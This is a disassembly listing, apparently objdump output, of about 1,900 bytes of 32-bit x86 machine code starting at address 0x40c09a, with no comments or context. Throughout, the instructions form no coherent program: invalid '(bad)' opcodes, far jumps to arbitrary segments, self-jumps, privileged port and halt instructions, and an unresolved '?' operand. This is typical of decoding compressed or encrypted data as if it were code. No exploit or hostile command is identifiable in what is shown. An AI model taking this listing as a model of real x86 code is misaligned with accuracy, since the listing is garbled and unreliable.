  40c09a:	jmp    0xfbf8:0x7d01dcd
  40c0a1:	inc    eax
  40c0a2:	das    
  40c0a3:	ret    
  40c0a4:	jle    0x40c0e3
  40c0a6:	sub    al,0x7a
  40c0a8:	mov    ecx,0x2f086faa
  40c0ad:	jae    0x40c08c
  40c0af:	push   esp
  40c0b0:	jmp    0xb766:0x1e9efab
  40c0b7:	jg     0x40c03b
  40c0b9:	mov    DWORD PTR [edx-0x93d1bd1],edx
  40c0bf:	sub    esp,edx
  40c0c1:	adc    DWORD PTR [ecx],edi
  40c0c3:	arpl   WORD PTR [ebp+0x129abf0f],cx
  40c0c9:	mov    ecx,edx
  40c0cb:	dec    esi
  40c0cc:	scas   al,BYTE PTR es:[edi]
  40c0cd:	out    0xa,eax
  40c0cf:	and    al,0xf5
  40c0d1:	lods   al,BYTE PTR ds:[esi]
  40c0d2:	cwde   
  40c0d3:	jmp    0x40c0d3
  40c0d5:	call   0x3ba18691
  40c0da:	pop    esp
  40c0db:	sbb    BYTE PTR [eax-0x5d],ch
  40c0de:	adc    ebp,DWORD PTR [ecx]
  40c0e0:	jmp    0xd3e2:0x7c50aa86
  40c0e7:	push   ss
  40c0e8:	mov    ebx,0x2ebd5bf9
  40c0ed:	push   ebx
  40c0ee:	test   DWORD PTR [eax],eax
  40c0f0:	mov    eax,0x434d780c
  40c0f5:	add    dl,BYTE PTR [ebx+0x49]
  40c0f8:	arpl   cx,si
  40c0fa:	push   ss
  40c0fb:	scas   eax,DWORD PTR es:[edi]
  40c0fc:	sti    
  40c0fd:	(bad)  
  40c0fe:	je     0x40c120
  40c100:	mov    eax,ds:0x8161978f
  40c105:	std    
  40c106:	mov    ecx,0x217e738b
  40c10b:	sbb    eax,0x87f00aab
  40c110:	cld    
  40c111:	mov    ecx,0x21cabc58
  40c116:	cmp    esi,DWORD PTR [ecx+0x63560381]
  40c11c:	sub    eax,0x799b47b5
  40c121:	push   ecx
  40c122:	dec    BYTE PTR [ecx-0x5b]
  40c125:	cs call 0x463774b8
  40c12b:	cld    
  40c12c:	popf   
  40c12d:	sbb    edi,DWORD PTR [ebx-0x42c7d2e7]
  40c133:	and    cl,BYTE PTR [ecx]
  40c135:	mov    ecx,0xbb289fa2
  40c13a:	cwde   
  40c13b:	hlt    
  40c13c:	jnp    0x40c0e9
  40c13e:	xchg   esi,eax
  40c13f:	ret    0x229d
  40c142:	addr16 not bh
  40c145:	test   al,0x3a
  40c147:	adc    ch,bl
  40c149:	inc    edx
  40c14a:	cmp    DWORD PTR [edi],esi
  40c14c:	sub    eax,0xe80fe920
  40c151:	or     al,0x8d
  40c153:	das    
  40c154:	add    al,0xa1
  40c156:	je     0x40c156
  40c158:	xor    eax,0x1c15324
  40c15d:	jne    0x40c14b
  40c15f:	ror    DWORD PTR [esi],1
  40c161:	mov    bl,0x20
  40c163:	je     0x40c1c9
  40c165:	mov    al,BYTE PTR [ecx-0x64bae29d]
  40c16b:	add    bh,BYTE PTR [ecx-0x34]
  40c16e:	xor    edx,DWORD PTR [eax-0x32b88da1]
  40c174:	dec    ecx
  40c175:	in     al,0xfe
  40c177:	adc    esi,DWORD PTR [ebp+0x1]
  40c17a:	push   esi
  40c17b:	sahf   
  40c17c:	xchg   al,bh
  40c17e:	jns    0x40c1ec
  40c180:	inc    edi
  40c181:	push   0xffffff98
  40c183:	mov    ch,0x59
  40c185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c186:	sbb    esp,edx
  40c188:	jmp    0x2fe02cdd
  40c18d:	pop    edx
  40c18e:	mul    DWORD PTR [ebx+eax*4-0x5e]
  40c192:	push   ebp
  40c193:	jns    0x40c144
  40c195:	sbb    BYTE PTR [ebx+edx*4],0xbd
  40c199:	int    0xf3
  40c19b:	dec    ebp
  40c19c:	(bad)  [ecx+edx*1-0x7aa089ea]
  40c1a3:	xchg   ecx,eax
  40c1a4:	xchg   BYTE PTR [ecx+0x22099a2c],cl
  40c1aa:	mov    edx,0x341210c8
  40c1af:	pop    ss
  40c1b0:	scas   al,BYTE PTR es:[edi]
  40c1b1:	pop    edi
  40c1b2:	dec    esp
  40c1b3:	or     al,0xef
  40c1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1b6:	and    eax,0xe36bdcbe
  40c1bb:	cmp    bh,BYTE PTR [eax-0x1b30e1b3]
  40c1c1:	loop   0x40c1bf
  40c1c3:	fist   DWORD PTR [eax-0x5faa81fe]
  40c1c9:	lahf   
  40c1ca:	push   esp
  40c1cb:	mov    edi,0xed30cf0d
  40c1d0:	jae    0x40c1b9
  40c1d2:	js     0x40c20f
  40c1d4:	imul   esi,DWORD PTR ds:0x5a1182db,0xffffff83
  40c1db:	hlt    
  40c1dc:	mov    cl,0x4d
  40c1de:	xchg   esp,eax
  40c1df:	pop    esp
  40c1e0:	clc    
  40c1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e2:	jg     0x40c1fc
  40c1e4:	xchg   edx,eax
  40c1e5:	cld    
  40c1e6:	sbb    DWORD PTR [edx+0x60],esi
  40c1e9:	push   edx
  40c1ea:	or     eax,0x47eb6a23
  40c1ef:	add    al,0x69
  40c1f1:	(bad)  
  40c1f2:	push   ebx
  40c1f3:	pop    esi
  40c1f4:	je     0x40c21b
  40c1f6:	cmp    DWORD PTR [edi+0x3d],esp
  40c1f9:	cmc    
  40c1fa:	cld    
  40c1fb:	xchg   ebx,eax
  40c1fc:	sbb    DWORD PTR [ebx+edi*8],ecx
  40c1ff:	shr    BYTE PTR [ebx],1
  40c201:	cmp    cl,dh
  40c203:	sub    DWORD PTR [ecx-0x3719319c],edi
  40c209:	aam    0x17
  40c20b:	xchg   edi,eax
  40c20c:	mov    dh,0xc0
  40c20e:	pop    esp
  40c20f:	mov    BYTE PTR [eax-0x5d],dh
  40c212:	ds aas 
  40c214:	out    0xaf,al
  40c216:	xlat   BYTE PTR ds:[ebx]
  40c217:	ficom  WORD PTR [edi+0x44]
  40c21a:	sar    DWORD PTR [eax+edi*1-0x2e],cl
  40c21e:	push   ecx
  40c21f:	es dec ebp
  40c221:	mov    ah,0x52
  40c223:	jne    0x40c22a
  40c225:	cld    
  40c226:	adc    edi,DWORD PTR [ecx+0x4d4b95f8]
  40c22c:	hlt    
  40c22d:	mov    edi,esp
  40c22f:	jp     0x40c1d3
  40c231:	inc    ecx
  40c232:	sbb    eax,0x58ca8b28
  40c237:	pop    ds
  40c238:	repz sbb al,0xbb
  40c23b:	push   es
  40c23c:	mov    WORD PTR [eax+0x74e513b7],ss
  40c242:	loope  0x40c1eb
  40c244:	add    BYTE PTR [esi+0xc7be6c5],ah
  40c24a:	push   ss
  40c24b:	and    edi,edx
  40c24d:	push   0xffffffc1
  40c24f:	mov    esi,0xa363f0de
  40c254:	or     DWORD PTR [ebp-0x39],eax
  40c257:	mov    ds:0x2ab99c90,eax
  40c25c:	or     eax,0x1d148835
  40c261:	mov    edx,0x6ecf4bab
  40c266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c267:	shl    DWORD PTR [esi+ebx*2],0xfc
  40c26b:	jle    0x40c2af
  40c26d:	or     bl,BYTE PTR [edx+0x16ed5401]
  40c273:	or     eax,0x8d48fb52
  40c278:	daa    
  40c279:	pop    edx
  40c27a:	jb     0x40c2e9
  40c27c:	push   ebp
  40c27d:	adc    al,0xb9
  40c27f:	in     eax,dx
  40c280:	jo     0x40c21d
  40c282:	daa    
  40c283:	adc    al,0xe5
  40c285:	mov    bl,BYTE PTR ds:0x923c4e34
  40c28b:	mov    esi,0xf0dc468e
  40c290:	mov    ecx,0x7879623f
  40c295:	dec    edx
  40c296:	jnp    0x40c313
  40c298:	popf   
  40c299:	or     esp,DWORD PTR fs:0x4fd54320
  40c2a0:	jle    0x40c26e
  40c2a2:	retf   
  40c2a3:	cs sahf 
  40c2a5:	mov    gs,WORD PTR [ecx+0x5e]
  40c2a8:	imul   edx,DWORD PTR ds:0xc3757193,0x187e0242
  40c2b2:	arpl   WORD PTR [esi-0x61],cx
  40c2b5:	je     0x40c31f
  40c2b7:	daa    
  40c2b8:	leave  
  40c2b9:	pop    esi
  40c2ba:	add    esi,0xffffffaf
  40c2bd:	push   edi
  40c2be:	hlt    
  40c2bf:	jb     0x40c334
  40c2c1:	fwait
  40c2c2:	mov    bh,0x80
  40c2c4:	xchg   ebx,eax
  40c2c5:	push   0x5469d872
  40c2ca:	adc    eax,0x83f460df
  40c2cf:	jb     0x40c29f
  40c2d1:	iret   
  40c2d2:	and    edx,DWORD PTR [ebx+eiz*1+0x653a492c]
  40c2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2da:	dec    esi
  40c2db:	push   ecx
  40c2dc:	ds es xchg ecx,eax
  40c2df:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c2e1:	cmp    dh,BYTE PTR [ebx+eax*2-0x45]
  40c2e5:	les    esi,FWORD PTR [ebx]
  40c2e7:	sub    eax,0x9f2d0b14
  40c2ec:	(bad)  
  40c2ed:	enter  0xfae0,0x9
  40c2f1:	dec    eax
  40c2f2:	mov    ch,0x8b
  40c2f4:	popf   
  40c2f5:	xchg   BYTE PTR [edx],bh
  40c2f7:	xlat   BYTE PTR ds:[ebx]
  40c2f8:	sbb    al,0x72
  40c2fb:	loopne 0x40c37c
  40c2fd:	pop    edx
  40c2fe:	fstp   st(4)
  40c300:	call   0x43ea:0x2c85355c
  40c307:	adc    bh,BYTE PTR [eax-0x55]
  40c30a:	call   0xbbee:0xab021dc6
  40c311:	out    dx,eax
  40c312:	mov    edi,0xc14f494
  40c317:	cwde   
  40c318:	push   ebp
  40c319:	out    dx,al
  40c31a:	gs pusha 
  40c31c:	fdivrp st(1),st
  40c31e:	add    eax,0xf729f140
  40c323:	sub    DWORD PTR [edx+0xc282423],0xf91f7b92
  40c32d:	mov    esp,0xb6733e08
  40c332:	adc    al,0x34
  40c334:	mul    DWORD PTR [eax+0x243af132]
  40c33a:	pop    DWORD PTR [edi-0x4bafd85d]
  40c340:	mov    edx,DWORD PTR [ebp+0x56]
  40c343:	push   ebp
  40c344:	xchg   edx,eax
  40c345:	ss and al,0x26
  40c348:	popa   
  40c349:	int    0x5f
  40c34b:	push   0x531062ab
  40c350:	aas    
  40c351:	add    al,0x4a
  40c353:	pop    ecx
  40c354:	cmp    al,0x2c
  40c356:	fmul   QWORD PTR [edx+0x7afcdb95]
  40c35c:	inc    dh
  40c35e:	xor    BYTE PTR [ebp-0x3d],dh
  40c361:	(bad)  
  40c362:	cld    
  40c363:	sahf   
  40c364:	sub    dh,BYTE PTR [esi+ebx*4]
  40c367:	fs leave 
  40c369:	fxch   st(3)
  40c36b:	sbb    ah,BYTE PTR ds:0x7e3fb848
  40c371:	or     BYTE PTR [ecx],al
  40c373:	aas    
  40c374:	lds    edi,FWORD PTR [eax+eiz*2+0x3b9ccc25]
  40c37b:	xchg   edi,eax
  40c37c:	jnp    0x40c384
  40c37e:	(bad)  
  40c37f:	jno    0x40c3a7
  40c381:	test   BYTE PTR [esi],cl
  40c383:	aad    0x6f
  40c385:	inc    edi
  40c386:	push   0x63
  40c388:	outs   dx,BYTE PTR ds:[esi]
  40c389:	sti    
  40c38a:	inc    ebx
  40c38b:	leave  
  40c38c:	(bad)  
  40c38d:	daa    
  40c38e:	add    BYTE PTR [ecx+0x2d],ch
  40c391:	pop    ebx
  40c392:	pop    es
  40c393:	jns    0x40c394
  40c395:	sbb    DWORD PTR [edx],ebx
  40c397:	es mov bh,0xdf
  40c39a:	sbb    eax,0xbd3a1a57
  40c39f:	cmp    ecx,DWORD PTR [edx-0x21]
  40c3a2:	daa    
  40c3a3:	inc    ecx
  40c3a4:	cmp    BYTE PTR [ebx+0x69674236],dh
  40c3aa:	xor    BYTE PTR [eax+0x4aa42298],dh
  40c3b0:	dec    ecx
  40c3b1:	pop    edx
  40c3b2:	je     0x40c3a6
  40c3b4:	add    ecx,edx
  40c3b6:	test   al,0x85
  40c3b8:	xchg   esp,eax
  40c3b9:	jb     0x40c3b5
  40c3bb:	and    al,0xa0
  40c3bd:	xchg   edx,eax
  40c3be:	jp     0x40c34e
  40c3c0:	xchg   edx,eax
  40c3c1:	dec    eax
  40c3c2:	iret   
  40c3c3:	test   BYTE PTR [esp+edx*8+0x2c],bh
  40c3c7:	xor    BYTE PTR [edi+0x5ecbefd4],0x3
  40c3ce:	call   0x3edc75f0
  40c3d3:	pushf  
  40c3d4:	leave  
  40c3d5:	pop    gs
  40c3d7:	fnstenv [esp+edi*2]
  40c3da:	jo     0x40c456
  40c3dc:	cdq    
  40c3dd:	loope  0x40c3a8
  40c3df:	fidiv  DWORD PTR [eax+edx*1]
  40c3e2:	and    ebp,DWORD PTR [edi-0x45]
  40c3e5:	dec    esp
  40c3e6:	aaa    
  40c3e7:	loopne 0x40c44d
  40c3e9:	and    eax,0x80afc29b
  40c3ee:	fcomp  QWORD PTR [ebx]
  40c3f0:	sbb    BYTE PTR ss:[ecx+ebp*4+0x6c],0xf8
  40c3f6:	scas   eax,DWORD PTR es:[edi]
  40c3f7:	dec    edx
  40c3f8:	push   ss
  40c3f9:	dec    edi
  40c3fa:	fcom   DWORD PTR [edi+0x30]
  40c3fd:	dec    ecx
  40c3fe:	je     0x40c3a7
  40c400:	and    ah,cl
  40c402:	sti    
  40c403:	dec    ebp
  40c404:	adc    BYTE PTR [edx+0x340c8e43],bh
  40c40a:	out    0x94,al
  40c40c:	xor    al,0x5a
  40c40e:	int    0xd9
  40c410:	pushf  
  40c411:	mov    esp,0xc2f9a021
  40c416:	(bad)  
  40c417:	mov    ecx,0x8f4f59d2
  40c41c:	je     0x40c3bf
  40c41e:	das    
  40c41f:	inc    ebp
  40c420:	xor    bh,bh
  40c422:	jne    0x40c45b
  40c424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c425:	dec    ebp
  40c426:	cld    
  40c427:	and    eax,0x35d16575
  40c42c:	nop
  40c42d:	mov    eax,ds:0x1c65307d
  40c432:	js     0x40c404
  40c434:	iret   
  40c435:	add    DWORD PTR ds:[ecx+0x6649d34c],ecx
  40c43c:	std    
  40c43d:	mul    BYTE PTR [edx*4-0x3a20d1fb]
  40c444:	adc    al,ch
  40c446:	jl     0x40c4c0
  40c448:	xchg   esi,eax
  40c449:	or     ch,dh
  40c44b:	or     BYTE PTR [edi+edi*4-0x26],dl
  40c44f:	sti    
  40c450:	adc    DWORD PTR [edi+ebx*2-0x68902493],eax
  40c457:	jae    0x40c44e
  40c459:	or     eax,0x83f19b79
  40c45e:	cld    
  40c45f:	add    cl,dh
  40c461:	sbb    BYTE PTR [edi],ah
  40c463:	inc    edi
  40c464:	ins    BYTE PTR es:[edi],dx
  40c465:	stos   DWORD PTR es:[edi],eax
  40c466:	rcl    DWORD PTR [ebp+eax*2-0x37],cl
  40c46a:	sbb    BYTE PTR [eax+eiz*4+0x7c57728a],cl
  40c471:	mov    dh,BYTE PTR [ebx-0x25]
  40c474:	ins    BYTE PTR es:[edi],dx
  40c475:	mov    DWORD PTR [ecx-0x4e],edx
  40c478:	fadd   DWORD PTR [ebx-0x257c01e8]
  40c47e:	xchg   esi,eax
  40c47f:	repnz add bl,BYTE PTR [esi+eiz*8-0x53]
  40c484:	popf   
  40c485:	popa   
  40c486:	inc    DWORD PTR [ecx-0x54b91616]
  40c48c:	loopne 0x40c426
  40c48e:	retf   0xe441
  40c491:	imul   ebx,ebp,0x6e
  40c494:	and    al,0x87
  40c496:	xor    BYTE PTR es:[ecx],bh
  40c499:	loop   0x40c478
  40c49b:	or     eax,0xbe2c1127
  40c4a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a1:	imul   esi,DWORD PTR fs:[eax],0xffffffca
  40c4a5:	inc    esi
  40c4a6:	ret    
  40c4a7:	lea    eax,[edi*2+0x2c482e2]
  40c4ae:	fisub  WORD PTR [ebp+ebx*1-0x47]
  40c4b2:	fxch   st(6)
  40c4b4:	push   0xfffffff2
  40c4b6:	jae    0x40c46f
  40c4b8:	jecxz  0x40c45e
  40c4ba:	fisttp WORD PTR [edi]
  40c4bc:	(bad)  
  40c4bd:	aad    0x9e
  40c4bf:	call   0xb1b83d67
  40c4c4:	(bad)  
  40c4c5:	rcl    DWORD PTR [esp+ebx*2-0x6feae302],cl
  40c4cc:	add    BYTE PTR [eax-0xd],dh
  40c4cf:	rcl    DWORD PTR [esi+ecx*2-0x604af0d6],1
  40c4d6:	sub    DWORD PTR [edx+0x32],ebx
  40c4d9:	outs   dx,BYTE PTR ds:[esi]
  40c4da:	inc    ebx
  40c4db:	cmp    eax,0xe0ca3d68
  40c4e0:	add    BYTE PTR [eax+ecx*8+0x7fe3b24],ch
  40c4e7:	ja     0x40c47c
  40c4e9:	ss dec ebp
  40c4eb:	xor    eax,0xab2dc810
  40c4f0:	mov    bl,BYTE PTR [esi-0x6018ad0]
  40c4f6:	lods   eax,DWORD PTR ds:[esi]
  40c4f7:	out    dx,al
  40c4f8:	addr16 into 
  40c4fa:	int3   
  40c4fb:	sub    al,0xbe
  40c4fd:	fsubr  st(4),st
  40c4ff:	ret    0x5966
  40c502:	fild   WORD PTR [esi-0x6311cbfd]
  40c508:	(bad)  
  40c509:	push   edx
  40c50a:	pop    es
  40c50b:	fnstcw WORD PTR [eax-0x66]
  40c50e:	nop
  40c50f:	bound  ebx,QWORD PTR [eax-0x31e1e55d]
  40c515:	(bad)  
  40c516:	ins    DWORD PTR es:[edi],dx
  40c517:	mov    dl,0x2c
  40c519:	shl    BYTE PTR [eax],cl
  40c51b:	ret    0x8653
  40c51e:	std    
  40c51f:	out    dx,al
  40c520:	enter  0x6d03,0xbd
  40c524:	cdq    
  40c525:	ss push ss
  40c527:	in     al,0x6d
  40c529:	scas   eax,DWORD PTR es:[edi]
  40c52a:	out    dx,eax
  40c52b:	jae    0x40c51a
  40c52d:	mov    ch,0x81
  40c52f:	mov    edi,DWORD PTR [edi-0x5f]
  40c532:	xor    bl,BYTE PTR [edi-0x7ebc4256]
  40c538:	adc    al,0x2f
  40c53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53b:	jle    0x40c595
  40c53d:	sub    ecx,ebx
  40c53f:	push   DWORD PTR [eax+ecx*1]
  40c542:	inc    ebx
  40c543:	mov    esp,0x6e1b7b85
  40c548:	sbb    ah,al
  40c54a:	xor    cl,dh
  40c54c:	fldcw  WORD PTR [eax+ebx*8]
  40c54f:	jmp    0x6f17:0x2a3a4768
  40c556:	clc    
  40c557:	sub    al,0xd0
  40c559:	sbb    BYTE PTR [eax],ah
  40c55b:	cmp    ecx,ecx
  40c55d:	fld    QWORD PTR [edx+0x29]
  40c560:	dec    edi
  40c561:	daa    
  40c562:	push   eax
  40c563:	enter  0x1a9b,0x2
  40c567:	comiss xmm2,DWORD PTR ds:0xcf457353
  40c56e:	or     ebx,DWORD PTR [ecx+0x66]
  40c571:	ret    
  40c572:	sbb    DWORD PTR [ebp+0x51],ecx
  40c575:	cwde   
  40c576:	inc    eax
  40c577:	dec    edi
  40c578:	push   ds
  40c579:	enter  0x7f92,0xe6
  40c57d:	and    eax,edx
  40c57f:	mov    DWORD PTR [edi+eiz*1+0x46],esi
  40c583:	adc    ebx,DWORD PTR [edx+0x59ecdcf6]
  40c589:	and    eax,DWORD PTR [ebx+eax*1-0x46fcfbee]
  40c590:	push   0xffffffb2
  40c592:	ss adc al,0x4e
  40c595:	outs   dx,DWORD PTR ds:[esi]
  40c596:	cli    
  40c597:	sahf   
  40c598:	mov    cl,0x68
  40c59a:	adc    al,0xfa
  40c59c:	into   
  40c59d:	add    eax,0xc92d7f9f
  40c5a2:	dec    esp
  40c5a3:	jecxz  0x40c59a
  40c5a5:	jbe    0x40c569
  40c5a7:	(bad)
  40c5aa:	test   al,0xcd
  40c5ac:	(bad)  
  40c5ae:	int3   
  40c5af:	cmp    bh,ch
  40c5b1:	loopne 0x40c60d
  40c5b3:	mov    ebx,0x6d1c4eed
  40c5b8:	inc    esi
  40c5b9:	mov    edx,0x470af6e7
  40c5be:	cbw    
  40c5c0:	int    0x5a
  40c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5c3:	jbe    0x40c5f2
  40c5c5:	xlat   BYTE PTR ds:[ebx]
  40c5c6:	pop    DWORD PTR [edi+0x100bdda9]
  40c5cc:	push   ss
  40c5cd:	dec    esp
  40c5ce:	xchg   DWORD PTR [edi],ecx
  40c5d0:	inc    ebx
  40c5d1:	rcr    DWORD PTR [eax],1
  40c5d3:	xor    al,0xca
  40c5d5:	cli    
  40c5d6:	in     al,dx
  40c5d7:	push   eax
  40c5d8:	in     eax,dx
  40c5d9:	dec    edx
  40c5db:	shl    BYTE PTR [edi],cl
  40c5dd:	mov    bh,0x4b
  40c5df:	jb     0x40c5be
  40c5e1:	push   ecx
  40c5e2:	xor    eax,0xd3e506bb
  40c5e7:	data16 aad 0x48
  40c5ea:	and    ebp,DWORD PTR [ecx+ecx*8-0x45]
  40c5ee:	lock or DWORD PTR cs:0x3be1ba46,esi
  40c5f6:	xchg   edi,eax
  40c5f7:	dec    ebx
  40c5f8:	enter  0xb20b,0xe7
  40c5fc:	les    esp,FWORD PTR [edx+0x43]
  40c5ff:	in     al,0x85
  40c601:	iret   
  40c602:	xchg   esi,ebp
  40c604:	inc    esi
  40c605:	call   0xec132ecd
  40c60a:	pop    ecx
  40c60b:	test   eax,0x59441f61
  40c610:	sbb    al,0x7d
  40c612:	push   ebx
  40c613:	int3   
  40c614:	and    dl,cl
  40c616:	jns    0x40c5b6
  40c618:	xchg   ebp,eax
  40c619:	sub    al,0xd3
  40c61b:	cmp    esi,DWORD PTR [eax+0x39]
  40c61e:	mov    ds:0x362d0cad,eax
  40c623:	das    
  40c624:	ja     0x40c5a7
  40c626:	push   edi
  40c627:	mov    ebx,0x5e293bfd
  40c62c:	idiv   cl
  40c62e:	fidiv  WORD PTR [edi-0x7a]
  40c631:	in     al,dx
  40c632:	ror    bh,1
  40c634:	retf   
  40c635:	sbb    ebp,edx
  40c637:	bound  ecx,QWORD PTR [eax+0xa]
  40c63a:	xor    eax,0xaad952e1
  40c63f:	pop    eax
  40c640:	arpl   WORD PTR [esp+edi*2-0x40],cx
  40c644:	pxor   mm6,QWORD PTR ds:0xb0b6ea
  40c64b:	test   al,0xc6
  40c64d:	jp     0x40c616
  40c64f:	or     eax,0x6a0d35ab
  40c654:	imul   eax,DWORD PTR [ecx-0x52],0x6f
  40c658:	pop    ebp
  40c659:	mov    ebx,0x83b47490
  40c65e:	push   0x56
  40c660:	and    al,0xe2
  40c662:	in     al,dx
  40c663:	jg     0x40c5fa
  40c665:	cdq    
  40c666:	ss inc edi
  40c668:	adc    ebx,DWORD PTR [edi+0x4c39fc54]
  40c66e:	das    
  40c66f:	xchg   edi,eax
  40c670:	ret    
  40c671:	lock and BYTE PTR [eax+0x352432f3],al
  40c678:	inc    eax
  40c679:	call   esi
  40c67b:	adc    eax,0x399eaf0c
  40c680:	iret   
  40c681:	jecxz  0x40c647
  40c683:	dec    edi
  40c684:	push   0xffffffae
  40c686:	mov    bh,0xa7
  40c688:	test   DWORD PTR [esi-0x138dd677],ecx
  40c68e:	sub    eax,DWORD PTR ds:0xc6a371bd
  40c694:	push   ds
  40c695:	xchg   edx,eax
  40c696:	jp     0x40c6b8
  40c698:	xor    al,0xb9
  40c69a:	test   al,0x20
  40c69c:	dec    eax
  40c69d:	xor    DWORD PTR [esi+0x63],0xffffff8e
  40c6a1:	push   0xa
  40c6a3:	jp     0x40c68b
  40c6a5:	aas    
  40c6a6:	ins    BYTE PTR es:[edi],dx
  40c6a7:	test   bl,al
  40c6a9:	sub    al,0xf7
  40c6ab:	mov    cl,ch
  40c6ad:	test   DWORD PTR [edi-0x69381c41],0xfbe7ab7
  40c6b7:	shl    BYTE PTR [eax+ebp*8+0x2b5df25b],1
  40c6be:	ret    0xda2
  40c6c1:	fwait
  40c6c2:	push   0xfffffff7
  40c6c4:	xchg   ecx,eax
  40c6c5:	adc    BYTE PTR [esi+0xf070e06],dh
  40c6cb:	dec    ebp
  40c6cc:	jmp    0xfe34:0x81ec91e0
  40c6d3:	(bad)  
  40c6d4:	xchg   edi,eax
  40c6d5:	mov    al,ds:0xb5179b00
  40c6da:	fldln2 
  40c6dc:	mov    DWORD PTR [eax+eiz*1-0x1ff1b8ea],edi
  40c6e3:	ret    0xe10d
  40c6e6:	jmp    0xebc:0xcb305ae9
  40c6ed:	jl     0x40c66f
  40c6ef:	push   es
  40c6f0:	xor    BYTE PTR [ebp+eax*2+0x1f],cl
  40c6f4:	push   ebp
  40c6f5:	fnstenv [edx+0x207b5a27]
  40c6fb:	rcl    BYTE PTR [edx+0x3],1
  40c6fe:	inc    esi
  40c6ff:	popa   
  40c700:	ds dec esi
  40c702:	mov    al,0xca
  40c704:	fild   QWORD PTR [eax]
  40c706:	adc    DWORD PTR [ebx],ecx
  40c708:	push   0xe82f35ca
  40c70d:	imul   esi,DWORD PTR [edi+0x12],0x5
  40c711:	les    edi,FWORD PTR [edx-0x666bc030]
  40c717:	or     DWORD PTR [ecx-0x635bdecf],edx
  40c71d:	inc    bx
  40c71f:	adc    ch,bh
  40c721:	cmp    al,0xe7
  40c723:	pop    edx
  40c724:	xchg   ebx,eax
  40c725:	or     eax,0x7e9dfc60
  40c72a:	dec    esi
  40c72b:	ret    
  40c72c:	add    ebx,ebx
  40c72e:	add    edx,ebp
  40c730:	mov    al,bl
  40c732:	jo     0x40c70d
  40c734:	fisubr DWORD PTR [ecx-0x5ffac332]
  40c73a:	popa   
  40c73b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c73c:	jmp    0x7f5c:0xdbe7f496
  40c743:	icebp  
  40c744:	mov    edx,0x7d4f9f4e
  40c749:	out    dx,eax
  40c74a:	jg     0x40c7c4
  40c74c:	xor    ecx,DWORD PTR [ebp-0x75025e6b]
  40c752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c753:	jle    0x40c75c
  40c755:	(bad)  
  40c756:	xchg   ecx,eax
  40c757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c758:	es mov esp,0x471a74b4
  40c75e:	add    edi,DWORD PTR [esi+ebp*2-0x1a]
  40c762:	test   eax,0x1ad476ee
  40c767:	mov    ch,0xc2
  40c769:	aas    
  40c76a:	sub    bl,BYTE PTR [ecx-0x5b]
  40c76d:	mov    ?,WORD PTR ds:0x4a0fe71a
  40c773:	or     BYTE PTR [eax+edx*2-0x1d],ah
  40c777:	push   esi
  40c778:	xchg   ebx,eax
  40c779:	push   es
  40c77a:	loop   0x40c774
  40c77c:	mov    edx,DWORD PTR ds:0x1e6a6a8c
  40c782:	cld    
  40c783:	push   ebp
  40c784:	or     al,0x77
  40c786:	add    DWORD PTR [ebx-0x75c82c3d],esi
  40c78c:	cwde   
  40c78d:	add    eax,0x4993dbff
  40c792:	mov    ebx,0x7ecd7bc3
  40c797:	push   esi
  40c798:	jmp    0x9e2aa46b
  40c79d:	or     eax,0x87f24aa7
  40c7a2:	sbb    BYTE PTR [esi+0x43],bh
  40c7a5:	ficomp DWORD PTR [eax+eiz*1-0x20065c92]
  40c7ac:	stc    
  40c7ad:	push   cs
  40c7ae:	jmp    0x81bb:0xae502ba2
  40c7b5:	cmp    DWORD PTR [edx],esp
  40c7b7:	xor    ah,bh
  40c7b9:	icebp  
  40c7ba:	data16 ficomp WORD PTR [edx-0x4c]
  40c7be:	rcr    DWORD PTR [esi],0x73
  40c7c1:	leave  
  40c7c2:	popa   
  40c7c3:	adc    edi,0x1f714348
  40c7c9:	push   edx
  40c7ca:	mov    BYTE PTR [eax],dh
  40c7cc:	cmc    
  40c7cd:	bound  cx,DWORD PTR [ebx]
  40c7d0:	push   ds
  40c7d1:	aad    0x1e
  40c7d3:	cdq    
  40c7d4:	mov    edx,0x752d539e
  40c7d9:	(bad)  
  40c7da:	mov    edi,0xdc828c5f
  40c7df:	in     al,0x47
  40c7e1:	mov    eax,ds:0xc5c12ab4
  40c7e6:	retf   0xdf83
  40c7e9:	mul    BYTE PTR [esi]
  40c7eb:	dec    ecx
  40c7ec:	jne    0x40c859
  40c7ee:	into   
  40c7ef:	push   ecx
  40c7f0:	pop    esi
  40c7f1:	mov    ecx,DWORD PTR [eax-0x7448de12]
  40c7f7:	and    dh,BYTE PTR [ecx]
  40c7f9:	mov    al,BYTE PTR [ebp+0x3c3b7e95]
  40c7ff:	mov    ds:0x6e0204f8,al
  40c804:	cmp    BYTE PTR [edi+ebp*1+0x7adbe80f],cl
  40c80b:	push   ds
  40c80c:	adc    DWORD PTR [ecx+0x36e4ac4b],esp
  40c812:	cmc    
  40c813:	and    eax,0x56f9ab35
  40c818:	pop    es
  40c819:	bound  edi,QWORD PTR [esi]
  40c81b:	mov    ebx,0x497e0eb1
  40c820:	push   ebp
  40c821:	(bad)  
  40c822:	jle    0x40c807
  40c824:	add    al,0xcd
  40c826:	or     eax,0x622d34ab
  40c82b:	jo     0x40c7fd
  40c82d:	fdivr  DWORD PTR [edx-0x1f]
  40c830:	mov    bh,0x3a
  40c832:	popf   
  40c833:	into   
  40c834:	(bad)  [eax-0x23]
  40c837:	aaa    
  40c838:	pop    eax
  40c839:	push   ss
  40c83a:	arpl   WORD PTR [eax],bp
  40c83c:	jbe    0x40c8bb
  40c83e:	iret   
  40c83f:	mov    WORD PTR [esi+edi*1-0x29],gs
  40c843:	and    ecx,DWORD PTR gs:[edx-0x55]
  40c847:	push   eax
  40c848:	jle    0x40c869
  40c84a:	sub    eax,DWORD PTR [ebp-0x5c]
  40c84d:	out    0xf0,eax
